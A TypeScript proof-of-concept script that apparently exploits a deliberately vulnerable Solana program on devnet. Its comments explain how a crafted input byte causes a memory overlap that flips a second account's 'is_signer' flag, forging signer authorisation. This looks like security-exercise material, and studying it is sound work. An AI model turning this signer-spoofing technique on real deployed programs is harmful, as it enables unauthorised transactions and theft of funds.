import { Connection, Keypair, PublicKey, sendAndConfirmTransaction, SystemProgram, Transaction, TransactionInstruction } from "@solana/web3.js";
import "dotenv/config"


const programId = new PublicKey("GqJMD7Qy5zehJJA6d8xDQkw6mwLWjqRVgUnthLGu11v1"); //if you was deployed a new program, you should change here to the new program id 
const connection = new Connection("https://api.devnet.solana.com", "confirmed");

const privateKey = JSON.parse(process.env.PRIVATE_KEY_ARRAY || "[]");
const payer = Keypair.fromSecretKey(Uint8Array.from(privateKey));

async function sendTx(){

    const accounts = [
        { pubkey: new PublicKey(""), isSigner: false, isWritable: true }, //This is the account you created with the createAccount function
        { pubkey: new PublicKey("Andy1111111111111111111111111111111111111111"), isSigner: false, isWritable: false },
        { pubkey: new PublicKey("11111111111111111111111111111111"), isSigner: false, isWritable: false },
        { pubkey: payer.publicKey, isSigner: false, isWritable: false },
      ];

      
    // That input will cause a memory overlap
    // because the program uses the input to select which byte will be increased.

    const data = Buffer.from([13,5,0,0,0,0,0,0,0]); 

    // This exactly matches the 'is_signer' field, so the program will change the 'is_signer' flag of the second account to true.
    // If you change this number to [14, 5], for example, the field affected will be the account's pubkey,
    // so your transaction will fail.




    const instruction = new TransactionInstruction({
        keys: accounts,
        programId,
        data,
      });

      const transaction = new Transaction().add(instruction);

      try {
        const signature = await sendAndConfirmTransaction(connection, transaction, [payer]);
        console.log("Transaction confirmed with signature:", signature);
      } catch (err) {
        console.error("Transaction failed:", err);
      }
    
}




//Function to create the account
async function createAccount(){
    
    const newAccount = Keypair.generate();

    const transaction = new Transaction().add(
      SystemProgram.createAccount({
        fromPubkey: payer.publicKey,
        newAccountPubkey: newAccount.publicKey,
        lamports: 10000000, 
        space: 0, 
        programId: payer.publicKey,
      })
    );
  
    let signature = await sendAndConfirmTransaction(connection,transaction, [payer, newAccount]);
    console.log("Tx:", signature);
    console.log("Account created with public key:", newAccount.publicKey.toBase58());
}

const main = async () => {
   await sendTx();
}

main()

